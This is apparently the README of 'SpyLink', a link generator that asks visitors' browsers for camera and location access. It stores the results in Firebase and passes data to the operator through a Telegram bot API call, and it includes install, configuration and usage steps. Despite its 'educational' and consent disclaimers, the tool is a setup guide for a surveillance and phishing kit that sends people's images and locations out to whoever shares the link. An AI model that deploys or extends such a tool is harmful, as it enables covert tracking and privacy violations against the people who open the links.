# 🕵️‍♂️ SpyLink — Link Generator 🌐

**Description**  
SpyLink is a demo tool that generates unique links which, upon user consent, request browser permissions such as camera and location. The collected data is stored securely on the site for educational, testing, or authorized research purposes.  

---

## ⚙️ What It Does

- Generates unique session links for demonstrations or controlled environments.  
- Requests camera and location access only after explicit user consent.  
- Saves approved data directly to the server for review and analysis.  

---

## 🚀 Quick Installation & Run
```terminal
#Install dependencies
pkg install git -y
pkg install nodejs -y
# Clone repository
git clone https://github.com/JavaKyoseva/SpyLink
```
## 🔥 Firebase Setup

1. Go to [Firebase Console](https://console.firebase.google.com) and create a new project (e.g., "SpyLink").  
2. Add a web app to your project and copy the generated `firebaseConfig`.  
3. HTML/JS, configuration Firebase SDK:

```js
        const firebaseConfig = {
  apiKey: "Your-Firebase-Api-Key",
  authDomain: "Your-Firebase-Auth-Domain",
  databaseURL: "Your-Firebase-Database-Url",
  projectId: "Your-Project-Id",
  storageBucket: "Your-Firebase-Storage-Bucket",
  messagingSenderId: "Your-Firebase-Id",
  appId: "Your-Firebase-App-Id",
  measurementId: "Your-Measurement-Id"
};
```

4. Secure your database via Firebase Rules to allow only authorized writes and reads.

5. Parameter.html file configuration
  
  5.1 Open Telegram and search for @BotFather
   
   Get a new bot token

  5.2 Write @chat_id and search
    
   Get a your chat id

  5.3 Edit the Parameter.html file
```js
  const encodedKey = encodeURIComponent(key);
  const botToken = 'Your-Bot-Token';
  const chatId = 'Your-Chat-Id';
  const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedKey}`;
```

6. Start localhost
```bash
cd spylink
npx http-server . -p 3000
# Open http://localhost:3000
```

---

🧭 Usage

1. Generate a session link from the admin panel.


2. Share the link only with users who have given explicit permission.


3. When the participant opens the link, the system will request camera and location access.


4. Upon consent, the data is securely saved on the site for further review.




---

⚠️ Important Notes

This project is created for educational and ethical testing purposes only.
Unauthorized collection, sharing, or misuse of data obtained through this system is strictly prohibited.
You are fully responsible for obtaining consent and ensuring compliance with all local laws and data protection regulations.
The authors and contributors of this project are not liable for any misuse or illegal activity associated with it.


---
